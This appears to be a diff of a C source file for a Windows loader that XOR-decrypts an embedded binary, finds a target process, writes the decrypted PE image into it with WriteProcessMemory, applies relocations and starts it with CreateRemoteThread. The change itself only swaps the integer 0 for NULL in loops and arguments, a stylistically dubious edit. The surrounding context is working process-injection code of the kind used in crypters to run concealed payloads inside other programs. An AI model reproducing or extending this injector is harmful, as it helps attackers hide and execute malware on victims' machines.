@@ -27,7 +27,7 @@ VOID decryptBinary(LPWSTR key)
     SIZE_T keyLenth = wcslen(key);
 
     // Decrypt the binary using the provided key
-    for (int i = 0; i < sizeof(binary); i++)
+    for (int i = NULL; i < sizeof(binary); i++)
         binary[i] ^= key[i % keyLenth];
 }
 #endif
@@ -50,7 +50,7 @@ DWORD WINAPI loadLibrary(LoaderData* loaderData)
     DWORD delta = (DWORD)(loaderData->imageBase - ntHeaders->OptionalHeader.ImageBase);
     while (relocation->VirtualAddress) {
         PWORD relocationInfo = (PWORD)(relocation + 1);
-        for (int i = 0, count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i < count; i++)
+        for (int i = NULL, count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i < count; i++)
             if (relocationInfo[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
                 *(PDWORD)(loaderData->imageBase + (relocation->VirtualAddress + (relocationInfo[i] & 0xFFF))) += delta;
 
@@ -110,7 +110,7 @@ VOID stub(VOID) { }
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd)
 {
     // Check for the target process
-    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
     if (processSnapshot == INVALID_HANDLE_VALUE)
         return 1;
 
@@ -163,7 +163,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
     PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+    for (int i = NULL; i < ntHeaders->FileHeader.NumberOfSections; i++)
         WriteProcessMemory(process, executableImage + sectionHeaders[i].VirtualAddress,
             binary + sectionHeaders[i].PointerToRawData, sectionHeaders[i].SizeOfRawData, NULL);
 
@@ -182,9 +182,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         NULL);
     WriteProcessMemory(process, loaderMemory + 1, loadLibrary,
         (DWORD)stub - (DWORD)loadLibrary, NULL);
-    WaitForSingleObject(CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)(loaderMemory + 1),
-        loaderMemory, 0, NULL), INFINITE);
-    VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
+    WaitForSingleObject(CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)(loaderMemory + 1),
+        loaderMemory, NULL, NULL), INFINITE);
+    VirtualFreeEx(process, loaderMemory, NULL, MEM_RELEASE);
 
     return TRUE;
 }
